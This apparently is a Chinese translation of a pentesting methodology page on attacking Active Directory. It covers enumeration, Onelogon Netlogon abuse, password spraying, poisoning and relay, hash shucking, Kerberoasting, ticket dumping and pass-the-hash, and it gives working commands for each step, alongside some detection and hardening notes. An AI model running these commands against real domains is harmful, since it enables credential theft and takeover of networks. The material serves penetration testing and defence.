# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概述

**Active Directory** 是一项基础技术，能够帮助**网络管理员**高效地在网络中创建和管理**域**、**用户**和**对象**。它经过专门设计，具备可扩展性，便于将大量用户组织为易于管理的**组**和**子组**，并在不同层级控制**访问权限**。

**Active Directory** 的结构由三个主要层级组成：**域**、**树**和**林**。**域**包含一组共享同一数据库的对象，例如**用户**或**设备**。**树**是通过共享结构连接的一组域，而**林**则由多个树组成，它们通过**信任关系**相互连接，构成组织结构的最高层级。每个层级都可以指定特定的**访问**和**通信权限**。

**Active Directory** 中的关键概念包括：

1. **目录** – 存储与 Active Directory 对象有关的所有信息。
2. **对象** – 指目录中的实体，包括**用户**、**组**或**共享文件夹**。
3. **域** – 作为目录对象的容器；一个**林**中可以有多个域，每个域维护自己的对象集合。
4. **树** – 共享同一根域的一组域。
5. **林** – Active Directory 组织结构的最高层级，由多个树组成，它们之间存在**信任关系**。

**Active Directory Domain Services (AD DS)** 包含一系列对网络内集中管理和通信至关重要的服务，包括：

1. **域服务** – 集中存储数据并管理**用户**与**域**之间的交互，包括**身份验证**和**搜索**功能。
2. **证书服务** – 负责安全**数字证书**的创建、分发和管理。
3. **轻型目录服务** – 通过 **LDAP 协议**为目录启用型应用程序提供支持。
4. **目录联合服务** – 提供**单点登录**功能，使用户能够在单个会话中通过身份验证访问多个 Web 应用程序。
5. **权限管理** – 通过限制未经授权的分发和使用，帮助保护版权材料。
6. **DNS 服务** – 对**域名**解析至关重要。

如需更详细的说明，请参阅：[**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos 身份验证**

要学习如何**攻击 AD**，你需要充分**理解** **Kerberos 身份验证流程**。\
[**如果你还不了解其工作原理，请阅读此页面。**](kerberos-authentication.md)

## 速查表

你可以访问 [https://wadcoms.github.io/](https://wadcoms.github.io)，快速查看可用于枚举/利用 AD 的命令。

> [!WARNING]
> Kerberos 通信通常**需要完全限定域名 (FQDN)**，以便客户端获取正确 SPN 的票据。通过 IP 地址访问机器时，通常会回退到 NTLM，而不是 Kerberos。

## AD 侦察（无凭据/会话）

如果你只能访问 AD 环境，但没有任何凭据/会话，可以尝试：

- **对网络进行 Pentest：**
  - 扫描网络，查找机器和开放端口，并尝试**利用漏洞**或从中**提取凭据**（例如，[打印机可能是非常有趣的目标](ad-information-in-printers.md)）。
  - 枚举 DNS 可能会提供域内关键服务器的信息，例如 Web、打印机、共享、VPN、媒体等。
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - 查看通用的[**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)，了解更多相关信息。
- **检查 SMB 服务是否允许 null 和 Guest 访问**（此方法在现代 Windows 版本上无法使用）：
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - 关于如何枚举 SMB 服务器的详细指南，请参阅：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **枚举 LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - 关于如何枚举 LDAP 的详细指南，请参阅（**特别注意匿名访问**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **投毒网络**
  - 通过[**使用 Responder 冒充服务**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)收集凭据
  - 通过[**滥用 relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)访问主机
  - 通过**暴露**[**伪造的 UPnP 服务并使用 evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)收集凭据
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html)：
  - 从内部文档、社交媒体、域环境中的服务（主要是 Web）以及公开可用的信息中提取用户名/姓名。
  - 如果你找到了公司员工的全名，可以尝试不同的 AD **用户名规则 (**[**参阅此处**](https://activedirectorypro.com/active-directory-user-naming-convention/))。最常见的规则有：_NameSurname_、_Name.Surname_、_NamSur_（姓名各取 3 个字母）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 _个随机字母加 3 个随机数字_（abc123）。
  - 工具：
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 用户枚举

- **匿名 SMB/LDAP 枚举：**查看 [**SMB Pentesting**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**LDAP Pentesting**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute 枚举**：当请求的**用户名无效**时，服务器会使用 **Kerberos 错误**代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ 响应，让我们能够判断用户名无效。对于**有效用户名**，服务器会返回 **AS-REP** 响应中的 **TGT**，或者返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示该用户需要进行预身份验证。
- **针对 MS-NRPC 的无身份验证**：在域控制器的 MS-NRPC (Netlogon) 接口上使用 auth-level = 1（无身份验证）。此方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，以在没有任何凭据的情况下检查用户或计算机是否存在。[NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 工具实现了此类枚举。相关研究可在[此处](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>查看。

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) 服务器**

如果你在网络中发现了这类服务器，也可以对其进行**用户枚举**。例如，可以使用 [**MailSniper**](https://github.com/dafthack/MailSniper) 工具：

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> 你可以在[**这个 github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)以及[**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)中找到用户名列表。
>
> 不过，你应该已经在此前执行的 recon 步骤中获取了**公司员工的姓名**。有了名字和姓氏后，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951)生成可能有效的用户名。

### Netlogon 易受攻击安全通道允许列表滥用（Onelogon）

即使 DC 上的 **Zerologon** 漏洞已修补，显式加入允许列表的帐户仍可能受到**旧版/易受攻击的 Netlogon 安全通道行为**影响。存在风险的配置是 GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** 或对应的注册表值 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**。

该值是一个 **SDDL 安全描述符**（参见 [Security Descriptors](security-descriptors.md)）。DACL 中具有相关 ACE 的任何帐户或组都可能成为攻击目标。例如，`O:BAG:BAD:(A;;RC;;;WD)` 实际上会将 **Everyone** 加入允许列表。

操作流程：

1. 通过检查 **SYSVOL/GPO** 和 **DC 实时注册表**，找出允许列表中的主体。
2. 将 SDDL 中的 **SID** 解析为真实的 AD 用户/计算机，并优先关注 **DC 机器帐户**、**信任帐户**以及其他特权机器。
3. 反复尝试以允许列表中的帐户进行 **MS-NRPC / Netlogon 身份验证**。
4. 猜测成功后，滥用 **Netlogon 密码设置**功能重置目标帐户密码（公开的 PoC 会将其设为空字符串）。<sup>[[9]](#references)[[10]](#references)</sup>

公开资料中的快速排查 / 实验室示例：

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

说明：

- **scanner** 很有用，因为有效的 allow-list 可能位于 **SYSVOL**、**registry**，或两者兼有。
- exploit path 本身很重要，因为一旦识别出存在漏洞的账户，后续操作**不需要 Domain Admin 权限**。
- Compromise **Domain Controller machine account**（例如 `DC$`）尤其危险，因为重置该密码可以直接启用更广泛的 **AD takeover** 路径。
- **Brute-force 可行性**取决于模式：公开资料描述了 meet-in-the-middle 方法、在有另一个 computer account 可用时进行 **24-bit** brute force，以及速度较慢的 **32-bit** 变体。

检测 / 加固说明：

- 审核 allow-list policy，除临时且明确要求的兼容性例外外，删除所有条目。
- 监控 DC **System** events **5827/5828/5829/5830/5831**，以发现易受攻击的 Netlogon 连接被拒绝、被发现或被 policy 明确允许的情况。
- 在移除旧版依赖前，将 `VulnerableChannelAllowList` 中的账户视为**高风险**。

### 已知一个或多个用户名

好，你已经知道一个有效用户名，但没有密码……那么可以尝试：

- [**ASREPRoast**](asreproast.md)：如果用户**没有** _DONT_REQ_PREAUTH_ 属性，你可以为该用户**请求 AS_REP message**，其中包含一些由该用户密码的派生值加密的数据。
- [**Password Spraying**](password-spraying.md)：尝试对每个已发现的用户使用最**常见的密码**，也许有用户使用了弱密码（请牢记 password policy！）。
  - 注意，你也可以对 OWA servers 进行 **spray**，尝试访问用户的 mail servers。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你或许可以通过对 **network** 中的某些协议进行 **poisoning**，**获取**一些可用于破解的 challenge **hashes**：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration 可以提供用户名、电子邮件标识符和命名模式、候选主机，以及可能被诱导进行身份验证的服务。利用这些信息识别可行的 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)，以及进入 AD 环境的潜在路径。

### NetExec 基于 workspace 的侦察与 relay posture 检查

- 使用 **`nxcdb` workspaces** 按 engagement 保存 AD 侦察状态：`workspace create <name>` 会在 `~/.nxc/workspaces/<name>` 下创建各 protocol 的 SQLite DB（smb/mssql/winrm/ldap 等）。使用 `proto smb|mssql|winrm` 切换视图，并用 `creds` 列出收集到的 secrets。完成后手动清除敏感数据：`rm -rf ~/.nxc/workspaces/<name>`。<sup>[[6]](#references)</sup>
- 使用 **`netexec smb <cidr>`** 快速发现子网中的信息，包括 **domain**、**OS build**、**SMB signing 要求**和 **Null Auth**。显示 `(signing:False)` 的成员主机容易受到 **relay** 攻击，而 DC 通常要求启用 signing。
- 直接从 NetExec 输出生成 **/etc/hosts 中的主机名**，便于确定攻击目标：

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- 即使由于 signing 导致 **SMB relay 到 DC 被阻止**，仍应探测 **LDAP** 的安全状况：`netexec ldap <dc>` 会显示 `(signing:None)` / 弱 channel binding。若 DC 要求 SMB signing，但禁用了 LDAP signing，则仍是可行的 **relay-to-LDAP** 目标，可用于 **SPN-less RBCD** 等攻击。

### 客户端打印机凭据泄露 → 批量验证域凭据

- 打印机/网页 UI 有时会在 HTML 中**嵌入经过遮蔽的管理员密码**。查看源代码/使用开发者工具可能会发现明文（例如 `<input value="<password>">`），从而获得 Basic-auth 访问权限，以扫描/打印存储库。
- 获取的打印作业可能包含**明文入职文档**，其中带有每个用户的密码。测试时应保持凭据配对关系一致：<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### 窃取 NTLM 凭据

如果你可以使用**匿名用户或 guest 用户** **访问其他 PC 或共享资源**，就可以**放置文件**（例如 SCF 文件）；如果这些文件被访问，便会**触**发针对你的 NTLM 身份验证，让你能够**窃取** **NTLM challenge** 并尝试破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking 与 NT-Candidate 攻击

**Hash shucking** 会将你已持有的每个 NT hash 当作其他较慢格式的候选密码，这些格式的密钥材料直接从 NT hash 派生。与其对 Kerberos RC4 tickets、NetNTLM challenges 或缓存凭据进行长时间暴力破解，不如将 NT hash 输入 Hashcat 的 NT-candidate 模式，让它验证密码是否复用，而无需还原明文。域被攻陷后，若能收集数千个当前及历史 NT hash，这种方法尤其有效。<sup>[[5]](#references)</sup>

适合在以下情况使用 shucking：

- 你有从 DCSync、SAM/SECURITY dumps 或凭据 vaults 获取的 NT hash 集合，需要测试这些密码是否在其他域/forest 中复用。
- 你捕获了基于 RC4 的 Kerberos 材料（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM responses 或 DCC/DCC2 blobs。
- 你想快速验证长且无法破解的密码是否被复用，并立即通过 Pass-the-Hash 横向移动。

此技术**无法用于**密钥并非 NT hash 的加密类型（例如 Kerberos etype 17/18 AES）。如果域强制使用 AES-only，则必须改用常规密码模式。

#### 构建 NT hash 集合

- **DCSync/NTDS** – 使用带 history 参数的 `secretsdump.py`，尽可能多地获取 NT hash（及其历史值）：

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  历史记录会大幅扩大候选池，因为 Microsoft 最多可为每个账户存储 24 个旧哈希。有关收集 NTDS secrets 的其他方法，请参阅：

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz `lsadump::sam /patch`）可提取本地 SAM/SECURITY 数据和缓存的域登录凭据（DCC/DCC2）。去重后，将这些哈希追加到同一个 `nt_candidates.txt` 列表。
- **跟踪元数据** – 记录每个哈希对应的用户名/域（即使 wordlist 只包含十六进制值也要记录）。当 Hashcat 显示破解成功的候选密码时，匹配哈希会立即告诉你哪个主体重复使用了该密码。
- 优先使用来自同一 forest 或受信任 forest 的候选项；这样在 shucking 时最有可能找到重合项。

#### Hashcat NT-candidate 模式

| 哈希类型                                  | 密码模式 | NT-candidate 模式 |
| ---------------------------------------- | ------------- | ----------------- |
| 域缓存凭据（DCC）          | 1100          | 31500             |
| 域缓存凭据 2（DCC2）       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意：

- NT-candidate 输入**必须保持为原始的 32 位十六进制 NT 哈希**。禁用规则引擎（不要使用 `-r`，也不要使用混合模式），因为 mangling 会破坏候选密钥材料。
- 这些模式本身并不会更快，但 NTLM 密钥空间（在 M3 Max 上约为 30,000 MH/s）比 Kerberos RC4（约为 300 MH/s）快约 100 倍。测试经过筛选的 NT 列表，远比在较慢的格式中遍历整个密码空间划算。
- 始终使用**最新的 Hashcat build**（`git clone https://github.com/hashcat/hashcat && make install`），因为模式 31500/31600/35300/35400 是最近才推出的。<sup>[[7]](#references)</sup>
- 目前没有适用于 AS-REQ Pre-Auth 的 NT 模式；AES etypes（19600/19700）需要明文密码，因为它们的密钥是通过 PBKDF2 从 UTF-16LE 密码派生的，而非原始 NT 哈希。

#### 示例 – Kerberoast RC4（模式 35300）

1. 使用低权限用户捕获目标 SPN 的 RC4 TGS（详情参见 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. 使用你的 NT 列表提取票据：

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat 会从每个 NT 候选值推导 RC4 密钥，并验证 `$krb5tgs$23$...` blob。匹配即确认该服务帐户使用了你已有的某个 NT 哈希。

3. 立即通过 PtH 转向：

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   如有需要，之后可以使用 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文。

#### 示例 – 缓存凭据（mode 31600）

1. 从已攻陷的工作站中转储缓存的登录信息：

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. 将感兴趣的域用户的 DCC2 行复制到 `dcc2_highpriv.txt` 中并对其进行 shuck：

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. 成功匹配后会得到你列表中已知的 NT hash，这证明缓存用户重复使用了密码。可直接将它用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`），或在 fast NTLM mode 下进行 brute-force 以还原明文。

完全相同的流程也适用于 NetNTLM challenge-response（`-m 27000/27100`）和 DCC（`-m 31500`）。找到匹配项后，你可以发起 relay、执行 SMB/WMI/WinRM PtH，或使用 masks/rules 离线重新破解 NT hash。



## 使用凭据/会话枚举 Active Directory

此阶段需要**已攻陷有效域账户的凭据或会话**。如果你拥有有效凭据或以域用户身份获得了 shell，**请记住，前面介绍的方法仍可用于攻陷其他用户**。

开始进行经过身份验证的枚举之前，请先了解 **Kerberos double-hop 问题**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 枚举

攻陷一个账户是**评估域环境的重要一步**，因为这能让你进行经过身份验证的 **Active Directory 枚举**：

关于 [**ASREPRoast**](asreproast.md)，你现在可以找出所有可能存在漏洞的用户；关于 [**Password Spraying**](password-spraying.md)，你可以获取**所有用户名的列表**，并尝试使用已攻陷账户的密码、空密码以及新发现的潜在密码。

- 你可以使用 [**CMD 执行基本侦察**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell 进行侦察**](../basic-powershell-for-pentesters/index.html)，这种方式更隐蔽
- 你还可以[**使用 powerview**](../basic-powershell-for-pentesters/powerview.md)提取更详细的信息
- Active Directory 侦察的另一款出色工具是 [**BloodHound**](bloodhound.md)。它**不太隐蔽**（具体取决于你使用的收集方法），但**如果你不在意这一点**，完全值得一试。查找用户可以通过 RDP 登录的位置、通往其他组的路径等。
  - **其他自动化 AD 枚举工具包括：**[**AD Explorer**](bloodhound.md#ad-explorer)**、**[**ADRecon**](bloodhound.md#adrecon)**、**[**Group3r**](bloodhound.md#group3r)**、**[**PingCastle**](bloodhound.md#pingcastle)**。**
- 查看 [**AD 的 DNS 记录**](ad-dns-records.md)，其中可能包含有用信息。
- 你可以使用 **SysInternal** Suite 中带 GUI 的工具 **AdExplorer.exe** 来枚举目录。
- 你还可以使用 **ldapsearch** 搜索 LDAP 数据库，在字段 _userPassword_ 和 _unixUserPassword_ 中查找凭据，或查看用户的 _description_ 和 _info_ 备注。_info_ 中看起来像密码但未标注用途的字符串只能视为候选项：应单独确认其用途和有效性，并避免在常规枚举输出中包含备注内容。有关其他方法，请参阅 PayloadsAllTheThings 上的 [AD 用户评论中的密码](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)。
- 在获得授权的情况下，检查 `\\<dc>\NETLOGON` 或 `\\<dc>\SYSVOL\<domain>\scripts` 下**可访问的**域登录脚本和驱动器映射脚本。[Microsoft 文档](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller)说明了 NETLOGON 共享的脚本目录用途。先列出名称，再在大小限制内检查相关且可读取的脚本；不要转储整个共享，也不要在常规枚举过程中输出凭据值。PowerShell 调用 [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **并不能保护脚本中以字面形式存储的密码**。仅凭该调用无法证明脚本中硬编码了秘密：应追踪其实际输入，然后单独验证账户、凭据是否有效以及账户权限。检查域脚本属于远程共享审查，与本地主机枚举是分开的。
- 如果你使用 **Linux**，也可以通过 [**pywerview**](https://github.com/the-useless-one/pywerview) 枚举域。
- 你还可以尝试以下自动化工具：
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有域用户**

  在 Windows 上，很容易获取所有域用户名（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 上，可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即使这一枚举部分看起来不长，它也是整个流程中最重要的部分。打开这些链接（尤其是 cmd、powershell、powerview 和 BloodHound 相关内容），学习如何枚举域，并持续练习，直到熟练掌握。在评估过程中，这是找到通往 DA 之路或判断无计可施的关键环节。

### 可预测的预创建计算机账户 -> gMSA 密码访问

为旧版加入流程预先创建的计算机账户，可能会保留可预测的初始密码。NetExec 的 `pre2k` 模块会识别具有特征性 `userAccountControl` 值 `4128`（`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`）的账户，并使用小写计算机名称的前 14 个字符（不含末尾的 `$`）尝试获取 Kerberos TGT。应将此 UAC 值视为候选项筛选条件，而不要仅凭账户属于 **Pre-Windows 2000 Compatible Access** 就认定其密码很弱。<sup>[[18]](#references)[[20]](#references)</sup>

使用经过身份验证的 LDAP 枚举来测试候选项，并保存成功获取的 TGT。`ALL=True` 会将测试范围扩展到默认 `4128` 筛选条件以外的对象。<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

默认/NTLM bind 失败**并不**会使此发现失效：使用 `-k`、可解析到 DC 的 FQDN，以及与 KDC 同步的时钟进行测试。成功运行的模块会在 `~/.nxc/modules/pre2k/` 下写入候选列表和获取的 ccaches。<sup>[[18]](#references)[[20]](#references)</sup>

攻陷 computer principal 后，梳理其嵌套组成员身份和出站权限。尤其是，列在 gMSA 的 `msDS-GroupMSAMembership` security descriptor 中的 principal 可以读取 `msDS-ManagedPassword`；NetExec 的 `--gmsa` 输出会显示获准的 principal，并在用于身份验证的计算机获得授权时返回当前 NT hash。<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

然后像评估其他凭据一样评估恢复的 gMSA：检查本地/域组成员身份、登录权限、SPN、委派和可访问的服务，再尝试 pass-the-hash。这种基于 ACL 的获取路径不同于 [Golden gMSA/dMSA](golden-dmsa-gmsa.md)，后者是在 KDS 根密钥泄露后推导托管密码。<sup>[[20]](#references)</sup>

计算机主体也可能对其他计算机对象或组拥有出站控制权限。获取该主体后，分别检查其嵌套成员身份和有效 ACL：对另一计算机对象的写入权限可能允许更改账户，而组成员身份权限可能带来登录角色。仅凭暂存账户标记、可预测的命名约定或 `GenericWrite` 关系，并不能证明完整攻击路径。

文件、共享或备份中可读取的 `msDS-ManagedPassword` blob 副本属于另一种暴露路径：LDAP 读取 ACL 无法保护存储在其他位置的副本。解读数据前，请验证它确实是托管密码 blob，并将这种情况与授权的 LDAP 读取及 KDS 根密钥推导区分开来。

### Kerberoast

Kerberoasting 是指获取服务使用的、与用户账户关联的 **TGS tickets**，并在**离线**状态下破解其加密内容；该加密基于用户密码。

更多内容请参阅：


{{#ref}}
kerberoast.md
{{#endref}}

### 远程连接（RDP、SSH、FTP、Win-RM 等）

获得一些凭据后，可以检查自己是否能访问任何**机器**。为此，可以根据端口扫描结果，使用 **CrackMapExec** 尝试通过不同协议连接多台服务器。

### 本地权限提升

如果你已攻陷凭据，或拥有普通域用户的会话，并且能够访问域中的**任何机器**，请寻找**在本地提升权限并收集凭据**的路径。本地管理员权限可能允许你从内存（LSASS）和本地存储（SAM）中**转储其他用户的哈希**。

本书有专门页面介绍 [**Windows 本地权限提升**](../windows-local-privilege-escalation/index.html)，以及一份[**检查清单**](../checklist-windows-privilege-escalation.md)。此外，别忘了使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### 当前会话票据

**不太可能**在当前用户的**票据**中找到能让你访问意外资源的权限，但你可以检查：

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

使用域凭据或用户会话时，可以重新检查 NTLM [**中继攻击**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)：经过身份验证的枚举和强制认证技术可能会暴露在未认证侦察期间无法发现的中继路径。

### 在计算机共享中查找凭据 | SMB 共享

现在你已经有了一些基本凭据，应该检查能否在 AD 内部的共享中**找到**任何**有趣的文件**。你可以手动操作，但这是一项非常枯燥且重复的任务（尤其是当你找到数百份需要检查的文档时）。

[**点击此链接，了解可以使用哪些工具。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### 窃取 NTLM 凭据

如果你可以**访问其他 PC 或共享**，就可以**放置文件**（例如 SCF 文件）。如果有人以某种方式访问了这些文件，它们就会**触发针对你的 NTLM 身份验证**，让你可以**窃取** **NTLM challenge** 并破解它：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

此漏洞允许任何经过身份验证的用户**控制域控制器**。


{{#ref}}
printnightmare.md
{{#endref}}

## Active Directory 中使用特权凭据/会话进行权限提升

**对于以下技术，普通域用户权限不足；你需要某些特殊权限/凭据才能执行这些攻击。**

### 哈希提取

希望你已经通过 [AsRepRoast](asreproast.md)、[密码喷洒](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括中继）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) 或[本地权限提升](../windows-local-privilege-escalation/index.html)，成功**控制了某个本地管理员账户**。\
接下来，就该转储内存中和本地存储的所有哈希了。\
[**阅读此页面，了解获取哈希的不同方法。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**获取用户的哈希后**，你就可以用它来**冒充该用户**。\
你需要使用某种**工具**，通过该**哈希执行** **NTLM 身份验证**；**或者**，你也可以创建一个新的 **sessionlogon**，并将该**哈希注入** **LSASS**，这样每当执行 **NTLM 身份验证**时，都会使用该**哈希**。mimikatz 使用的是后一种方法。\
[**阅读此页面，了解更多信息。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

此攻击旨在**使用用户的 NTLM 哈希请求 Kerberos 票据**，作为常见的通过 NTLM 协议执行 Pass The Hash 的替代方案。因此，在禁用 **NTLM 协议**、仅允许 **Kerberos** 作为身份验证协议的网络中，此方法尤其**有用**。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击中，攻击者会**窃取用户的身份验证票据**，而非其密码或哈希值。随后，攻击者会使用窃取的票据**冒充该用户**，从而未经授权访问网络中的资源和服务。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### 凭据重用

如果你有**本地管理员**的**哈希**或**密码**，应该尝试使用它在其他 **PC** 上**本地登录**。

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
